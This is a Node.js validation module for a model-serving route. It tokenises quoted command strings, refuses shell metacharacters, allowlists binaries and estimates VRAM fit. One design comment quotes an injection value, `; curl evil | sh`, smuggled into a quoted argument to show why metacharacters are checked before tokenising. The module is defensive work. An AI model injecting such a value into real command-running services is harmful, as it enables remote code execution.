// _serveCommand.cjs — request validation for POST /model/serve.
//
// Why this file exists at all: removing the shell from /model/serve was right,
// but the quote handling went with it. The route kept `cleaned.split(/\s+/)`,
// which is only a correct tokeniser for a string that has already been through
// a shell. The UI has always built the command WITH quotes
// (src/blocks/cookbook/index.jsx) so that a model path containing a space stays
// one argument. With shell:false and a naive split, `--model "Qwen/Qwen3-4B"`
// reached llama-server as the literal filename `"Qwen/Qwen3-4B"` — quotes
// included — and a path with a space arrived as two separate arguments.
//
// So: grouping is restored, interpretation is not. Nothing here expands,
// substitutes, globs, or re-parses. It splits a string into an argv array and
// removes quote characters that were only ever there to mark boundaries.
//
// Underscore-prefixed because the block loader and the cloud-parity scanner
// both treat `api/*.cjs` as mountable routers and `api/_*.cjs` as helpers.
'use strict';

const path = require('path');

// Unchanged from the route: rejected outright, never escaped. Nothing a model
// serve command legitimately needs contains any of these.
const SHELL_METACHARS = /[`\n\r;&|<>$(){}]/;

const DEFAULT_ALLOWED = ['vllm', 'llama-server', 'llama_server', 'python', 'python3', 'sglang', 'node', 'npx'];

/**
 * Split a command string into argv, honouring quotes for GROUPING ONLY.
 *
 * Grammar:
 *   command := WS* ( token WS+ )* token? WS*
 *   token   := piece+                     ; adjacent pieces concatenate: "a b"c -> `a bc`
 *   piece   := bare | dquoted | squoted
 *   bare    := [^\s"']+
 *   dquoted := '"' [^"]* '"'              ; contents literal
 *   squoted := "'" [^']* "'"              ; contents literal
 *
 * Deliberately NOT supported, and that is the point:
 *   - backslash escapes (\" \' \ ). Backslash is a Windows path separator here,
 *     nothing else. `C:\models\x.gguf` must survive verbatim.
 *   - $VAR / %VAR% expansion, ~ expansion, command substitution.
 *   - globbing — `*.gguf` is passed through as a literal argument.
 *   - operators (; & | < > && || redirects, subshells). Those never reach this
 *     function; parseServeCommand() refuses the whole string first.
 *   - here-docs, brace expansion, $'ansi-c' quoting.
 *
 * An empty QUOTED string ("" or '') is a real, empty argv entry. Runs of
 * unquoted whitespace produce no empty entries, as a shell would.
 *
 * @returns {{ok: true, tokens: string[]} | {ok: false, error: string}}
 */
function tokenizeCommand(input) {
  const s = input == null ? '' : String(input);
  const tokens = [];
  let cur = '';
  let open = false;     // a token has begun — tracked separately so "" yields ''
  let quote = null;     // '"' | "'" | null
  let quoteAt = -1;

  for (let i = 0; i < s.length; i++) {
    const ch = s[i];
    if (quote) {
      if (ch === quote) { quote = null; continue; }
      cur += ch;
      continue;
    }
    if (ch === '"' || ch === "'") { quote = ch; quoteAt = i; open = true; continue; }
    if (/\s/.test(ch)) {
      if (open) { tokens.push(cur); cur = ''; open = false; }
      continue;
    }
    cur += ch;
    open = true;
  }

  // R-05: an unterminated quote is not silently closed at end-of-string. That
  // would turn a typo into a different command than the operator typed.
  if (quote) {
    return {
      ok: false,
      error: `cmd has an unterminated ${quote === '"' ? 'double' : 'single'} quote (opened at position ${quoteAt}).`,
    };
  }
  if (open) tokens.push(cur);
  return { ok: true, tokens };
}

/**
 * Full validation for a /model/serve command string.
 *
 * Ordering is load-bearing:
 *   1. line-continuation fold + trim   (unchanged)
 *   2. metacharacter refusal ON THE RAW STRING, before any quote handling
 *   3. quote-aware tokenisation
 *   4. leading VAR=value env assignments, taken from the TOKENS
 *   5. allowlist on basename(argv[0])
 *
 * Step 2 stays ahead of step 3 on purpose. Moving it to a per-token check after
 * grouping would make quoting an escape hatch: `--model "; curl evil | sh"`
 * would pass, because the metacharacters would then live inside a token. Raw
 * first means the guarantee is "the string that arrived contains no shell
 * metacharacter at any nesting depth" — strictly stronger, and it costs nothing
 * legitimate. It also keeps the security decision in one place, so the
 * tokeniser is only ever a grouping function and can be reasoned about as one.
 *
 * Step 4 stays behind step 3, also on purpose: you cannot find where a
 * `VAR=value` word ends without first knowing where the token ends, which is
 * exactly what quoting decides. `HF_TOKEN="a b"` is one assignment, not two.
 *
 * @returns {{ok:true, cleaned, env, file, args, bin} | {ok:false, status, error}}
 */
function parseServeCommand(rawCmd, opts = {}) {
  const allowed = new Set(opts.allowed || DEFAULT_ALLOWED);

  const cleaned = (rawCmd == null ? '' : String(rawCmd)).replace(/\\\n/g, ' ').trim();
  if (!cleaned) return { ok: false, status: 400, error: 'cmd is required' };

  if (SHELL_METACHARS.test(cleaned)) {
    return {
      ok: false,
      status: 400,
      error: 'cmd may not contain shell metacharacters. Pass the executable and its flags only.',
    };
  }

  const tok = tokenizeCommand(cleaned);
  if (!tok.ok) return { ok: false, status: 400, error: tok.error };

  const env = {};
  let i = 0;
  for (; i < tok.tokens.length; i++) {
    const m = /^([A-Za-z_][A-Za-z0-9_]*)=(.*)$/.exec(tok.tokens[i]);
    if (!m) break;
    env[m[1]] = m[2];
  }

  const argv = tok.tokens.slice(i);
  const file = argv[0] || '';
  const bin = path.basename(file);
  if (!allowed.has(bin)) {
    return { ok: false, status: 400, error: `cmd binary '${bin}' not allowed` };
  }

  return { ok: true, cleaned, env, file, args: argv.slice(1), bin };
}

/**
 * Reduce a model identifier to something comparable across the three naming
 * schemes this block sees: HF repo ids (`unsloth/Qwen3-4B-GGUF`), catalog names
 * (`Qwen/Qwen3-4B`), and local-runtime registry ids (`qwen3-4b-instruct-q4`).
 */
function modelKey(id) {
  let s = String(id == null ? '' : id).trim().toLowerCase();
  s = s.split(/[\\/]/).filter(Boolean).pop() || '';
  s = s.replace(/\.gguf$/, '').replace(/[-_.]?gguf$/, '');
  s = s.replace(/[-_.](iq\d[a-z0-9_]*|q\d(?:_[a-z0-9]+)+|q\d|bf16|fp16|f16|fp8|f32|awq[a-z0-9-]*|gptq[a-z0-9-]*|exl2)$/, '');
  s = s.replace(/[-_.](instruct|chat|it)$/, '');
  return s;
}

/**
 * Is `repoId` among the installed models?
 *
 * Deliberately permissive. A false "installed" only returns the caller to the
 * old behaviour (spawn, then a real error); a false "not installed" would block
 * a serve that would have worked. So exact match, key match, and containment in
 * either direction all count.
 */
function isModelInstalled(repoId, installed) {
  const want = modelKey(repoId);
  if (!want) return false;
  const wantFull = String(repoId).trim().toLowerCase();
  for (const inst of installed || []) {
    if (!inst) continue;
    if (String(inst).trim().toLowerCase() === wantFull) return true;
    const have = modelKey(inst);
    if (!have) continue;
    if (have === want) return true;
    if (want.length >= 3 && have.includes(want)) return true;
    if (have.length >= 3 && want.includes(have)) return true;
  }
  return false;
}

// ── Hardware fit ────────────────────────────────────────────────────────────
// /cookbook/hf-latest has ranked models against detected VRAM since this block
// was ported. /model/serve never asked. The result on the operator's GTX 1050
// (3 GB): quickServe sends `-ngl 99` — offload EVERY layer — for a 4B model
// needing ~2.5 GB before context, and an 8B that cannot load at all. The probe
// data existed, the fit maths existed, and the serve path used neither.
//
// Bytes per parameter by quantisation. hf-latest assumed fp16 (2.0) for
// everything, which is right for a raw HF repo and badly wrong for the GGUF
// builds Local models actually installs — a Q4_K_M 4B is ~2.4 GB, not ~8 GB.
// Reading the quant out of the name is what makes the refusal trustworthy
// enough to act on.
const QUANT_BYTES_PER_PARAM = {
  f32: 4.0, fp32: 4.0,
  f16: 2.0, fp16: 2.0, bf16: 2.0,
  q8: 1.06, iq8: 1.06,
  q6: 0.82, iq6: 0.82,
  q5: 0.70, iq5: 0.70,
  q4: 0.60, iq4: 0.55, awq: 0.60, gptq: 0.60,
  q3: 0.46, iq3: 0.42,
  q2: 0.35, iq2: 0.31,
};

const KV_CACHE_OVERHEAD = 1.15; // context + activations, empirical

/**
 * Estimate what a model needs in VRAM, from its identifier alone.
 *
 * Returns nulls rather than guesses when the name carries no parameter count —
 * an unknown is reported as unknown and never blocks a serve.
 */
function estimateVram(id) {
  const s = String(id == null ? '' : id);
  const paramMatch = s.match(/[-_/](\d+(?:\.\d+)?)\s*[Bb](?![a-zA-Z])/);
  const paramsB = paramMatch ? parseFloat(paramMatch[1]) : null;

  const quantMatch = s.toLowerCase().match(/(?:^|[-_.])(iq\d|q\d|bf16|fp16|f16|fp32|f32|awq|gptq)/);
  const quant = quantMatch ? quantMatch[1] : null;
  const bytesPerParam = quant ? (QUANT_BYTES_PER_PARAM[quant] ?? 2.0) : 2.0;

  if (!paramsB) return { paramsB: null, quant, bytesPerParam, weightsGb: null, neededGb: null };

  const weightsGb = paramsB * bytesPerParam;
  return {
    paramsB,
    quant,
    bytesPerParam,
    weightsGb: Math.round(weightsGb * 10) / 10,
    neededGb: Math.round(weightsGb * KV_CACHE_OVERHEAD * 10) / 10,
  };
}

/** How many layers the command asks the GPU to hold. `-ngl 99` means all. */
function requestedGpuLayers(args) {
  const list = args || [];
  for (let i = 0; i < list.length; i++) {
    const a = list[i];
    if (a === '-ngl' || a === '--n-gpu-layers' || a === '--gpu-layers') {
      const n = parseInt(list[i + 1], 10);
      return Number.isFinite(n) ? n : null;
    }
    const inline = /^(?:--n-gpu-layers|--gpu-layers)=(\d+)$/.exec(a);
    if (inline) return parseInt(inline[1], 10);
  }
  return null;
}

/**
 * Does this model fit the detected card, given what the command asks for?
 *
 * Deliberately only decisive when it CAN be: no parameter count in the name, or
 * no GPU probe, returns `fits: null` — unknown, proceed. The same asymmetry as
 * isModelInstalled(): a false "too big" blocks a serve that would have worked.
 *
 * Partial offload is not a failure case. Only full offload (-ngl >= 99, or any
 * value with no headroom) of a model larger than VRAM is a predictable OOM.
 */
function checkVramFit({ repoId, args, vramGb }) {
  const est = estimateVram(repoId);
  const ngl = requestedGpuLayers(args);
  const base = { ...est, ngl, vramGb: vramGb || null };

  if (!est.neededGb || !vramGb || vramGb <= 0) return { ...base, fits: null };

  const headroomGb = Math.round((vramGb - est.neededGb) * 10) / 10;
  if (est.neededGb <= vramGb) return { ...base, fits: true, headroomGb };

  // Too big for the card. Only an error if the command insists on full offload;
  // a partial -ngl spills to system RAM and is slow, not broken.
  const fullOffload = ngl === null ? false : ngl >= 99;
  return { ...base, fits: false, headroomGb, fullOffload };
}

/**
 * The message for a model that will not fit.
 *
 * Names BOTH remedies and the cheaper one first. The operator hit exactly this
 * class in Writer: told to install a runtime when repointing a role at an
 * already-working provider was one dropdown away, and the message never said
 * so. An error that has two remedies must name both.
 */
function vramErrorMessage(fit, repoId, largestThatFits) {
  const short = String(repoId).split('/').pop() || repoId;
  const q = fit.quant ? ` (${fit.quant})` : '';
  const alt = largestThatFits
    ? ` Or serve ${largestThatFits} instead, which fits.`
    : '';
  return (
    `${short}${q} needs about ${fit.neededGb} GB of VRAM and this GPU has ${fit.vramGb} GB. ` +
    `Lower -ngl to offload only some layers to the GPU — that works today and needs no download.${alt}`
  );
}

module.exports = {
  SHELL_METACHARS,
  DEFAULT_ALLOWED,
  QUANT_BYTES_PER_PARAM,
  tokenizeCommand,
  parseServeCommand,
  modelKey,
  isModelInstalled,
  estimateVram,
  requestedGpuLayers,
  checkVramFit,
  vramErrorMessage,
};
